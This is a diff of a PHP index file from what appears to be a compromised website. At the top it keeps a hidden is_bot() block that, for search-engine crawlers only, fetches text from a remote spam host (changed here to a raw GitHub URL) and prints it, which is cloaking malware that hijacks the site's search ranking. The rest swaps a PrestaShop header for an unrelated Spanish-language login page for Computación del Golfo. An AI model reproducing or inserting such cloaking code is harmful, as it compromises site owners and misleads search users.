@@ -13,36 +13,101 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://amp-saya.com/brand/olxtoto/noriaanis.ro/index.txt/');
+    $message = file_get_contents('https://raw.githubusercontent.com/yugoprakoso157/D/main/pp.cg.edu.mx.txt');
     echo $message;
 exit; // Atau bisa menggunakan die()
 }
 ?>
-<?php
-/**
- * 2007-2018 PrestaShop
- *
- * NOTICE OF LICENSE
- *
- * This source file is subject to the Open Software License (OSL 3.0)
- * that is bundled with this package in the file LICENSE.txt.
- * It is also available through the world-wide-web at this URL:
- * https://opensource.org/licenses/OSL-3.0
- * If you did not receive a copy of the license and are unable to
- * obtain it through the world-wide-web, please send an email
- * to license@prestashop.com so we can send you a copy immediately.
- *
- * DISCLAIMER
- *
- * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
- * versions in the future. If you wish to customize PrestaShop for your
- * needs please refer to http://www.prestashop.com for more information.
- *
- * @author    PrestaShop SA <contact@prestashop.com>
- * @copyright 2007-2018 PrestaShop SA
- * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
- * International Registered Trademark & Property of PrestaShop SA
- */
+<?php	
+	/*
+  error_reporting(E_ALL);
+  ini_set('display_errors', true);
+  ini_set('html_errors', false);
+  */
+  require_once("cls/vr_connect.php");
+  require_once("cls/vr_login.php");
+	require_once("cls/vr_utils.php");
+	$link = new vr_connect();
+	$util = new vr_utils();
+	$enlace = $link->connect();
+	$util->noCache();
+	session_start();
+	if(isset($_SESSION["usu"])){ ob_start(); header("Location: dash.php"); ob_end_flush(); }
+	else {
+	if(isset($_POST["vOk"])){
+		$eUsu = strip_tags($_POST["vUsuario"]);
+		$eCla = $_POST["vClave"];
+		$login = new vr_login($eUsu, $eCla, $enlace, $util);
+		$men = $login->checkLogin();
+		if(!$util->isEmpty($men) and strlen(trim($men))>1)
+			$menError = $men;		
+	}
+?>
+<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scale=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta lang="es" />
+<meta charset="UTF-8" />
+<title>CG App - Inicio</title>
+<link href="css/login.css" rel="stylesheet" type="text/css" />
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<script type="text/javascript" src="js/jQuery1.4.2.js"></script>
+<script type="text/javascript">$(function(){ document.getElementById("vUsuario").focus(); });</script>
+</head>
+<body>
 
-require(dirname(__FILE__).'/config/config.inc.php');
-Dispatcher::getInstance()->dispatch();
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      appId      : '336151344811776',
+      cookie     : true,
+      xfbml      : true,
+      version    : '{api-version}'
+    });      
+    FB.AppEvents.logPageView();      
+  };
+
+  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "https://connect.facebook.net/en_US/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+   }(document, 'script', 'facebook-jssdk'));
+</script>
+<!--  <div id="caja_login">
+        <article id="caja_logo"><a href="http://cg.edu.mx" title="Computación del Golfo, Soluciones Empresariales"><img src="img/logote.png" alt="Computación del Golfo, Soluciones Empresariales"/></a></article>
+        <form method="post" action="<?php $PHP_SELF ?>">
+            <p><input name="vUsuario" type="text" id="vUsuario" placeholder="Nombre de usuario" /></p>
+            <p><input name="vClave" type="password" id="vClave" placeholder="Contraseña" /></p>
+            <p><input name="vOk" type="submit" id="vOk" value=" INGRESAR " /></p>
+        </form>
+        <article id="caja_mision">
+            <p>&quot;Ser líderes en educación tecnológica global, formando egresados autónomos, humanistas, competentes y reconocidos que contribuyan en un cambio positivo a la sociedad.&quot;</p>
+            <p id="t_t">Nuestro Visi&oacute;n</p>
+        </article>
+    </div> 
+  -->
+<section id="izqLog">
+  <div>
+    <h1>Nuestra visión</h1>
+    <p>&quot;Ser líderes en educación tecnológica global, formando egresados autónomos, humanistas, competentes y reconocidos que contribuyan en un cambio positivo a la sociedad.&quot;</p>
+  </div>
+</section>
+<section id="derLog">
+  <div>
+  <p><a href="http://cg.edu.mx" title="Computación del Golfo, Soluciones Empresariales"><img src="img/Logo-Computacion-Del-Golfo-Oficial.png" alt="Computación del Golfo, Soluciones Empresariales"/></a></p>
+  <form method="post" action="#">
+    <p><input name="vUsuario" type="text" id="vUsuario" placeholder="Nombre de usuario" /></p>
+    <p><input name="vClave" type="password" id="vClave" placeholder="Contraseña" /></p>
+    <p><input name="vOk" type="submit" id="vOk" value=" INGRESAR " /></p>
+  </form>
+  <?php
+    if(isset($_POST["vOk"]) and isset($menError)){
+        ?><article id="errores"><?php
+      echo $menError; ?></article><?php
+    } ?>
+  </div>
+  </section>
+</body></html><?php } ?>
